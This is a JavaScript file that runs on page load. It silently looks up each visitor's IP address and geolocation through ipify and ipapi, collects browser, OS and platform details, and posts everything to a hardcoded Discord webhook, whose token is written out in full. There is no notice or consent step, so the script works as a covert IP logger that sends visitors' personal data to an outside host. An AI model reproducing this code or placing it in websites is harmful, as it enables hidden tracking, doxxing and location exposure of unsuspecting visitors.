document.addEventListener('DOMContentLoaded', (event) => {
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            const ip = data.ip;
            fetch(`https://ipapi.co/${ip}/json/`)
                .then(response => response.json())
                .then(geoData => {
                    const userAgent = navigator.userAgent;
                    const userDetails = {
                        ip: ip,
                        city: geoData.city,
                        region: geoData.region,
                        country: geoData.country_name,
                        latitude: geoData.latitude,
                        longitude: geoData.longitude,
                        timezone: geoData.timezone,
                        currency: geoData.currency,
                        calling_code: geoData.calling_code,
                        isp: geoData.org,
                        device: {
                            userAgent: userAgent,
                            platform: navigator.platform,
                            os: getOS(),
                            browser: getBrowser()
                        }
                    };

                    fetch('https://discord.com/api/webhooks/1462882953377087757/RNYEOGsYG6tUTxW-0LEDAKlBNK0eDs9fG2vNKpL83_uhR19Hga7_AKUi8ihYsjuNJDaD', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({ content: `New visitor details:\n${JSON.stringify(userDetails, null, 2)}` })
                    })
                    .then(response => response.json())
                    .then(data => {
                        console.log('Success:', data);
                    })
                    .catch((error) => {
                        console.error('Error:', error);
                    });
                })
                .catch((error) => {
                    console.error('Error:', error);
                });
        })
        .catch((error) => {
            console.error('Error:', error);
        });
});

function getOS() {
    const userAgent = navigator.userAgent;
    let os = 'Unknown';
    if (userAgent.indexOf('Win') !== -1) os = 'Windows';
    else if (userAgent.indexOf('Mac') !== -1) os = 'MacOS';
    else if (userAgent.indexOf('X11') !== -1) os = 'UNIX';
    else if (userAgent.indexOf('Linux') !== -1) os = 'Linux';
    else if (userAgent.indexOf('Android') !== -1) os = 'Android';
    else if (userAgent.indexOf('iPhone') !== -1) os = 'iOS';
    return os;
}

function getBrowser() {
    const userAgent = navigator.userAgent;
    let browser = 'Unknown';
    if (userAgent.indexOf('Firefox') !== -1) browser = 'Firefox';
    else if (userAgent.indexOf('Chrome') !== -1) browser = 'Chrome';
    else if (userAgent.indexOf('Safari') !== -1) browser = 'Safari';
    else if (userAgent.indexOf('Opera') !== -1 || userAgent.indexOf('OPR') !== -1) browser = 'Opera';
    else if (userAgent.indexOf('Trident') !== -1) browser = 'Internet Explorer';
    else if (userAgent.indexOf('Edg') !== -1) browser = 'Edge';
    return browser;
}
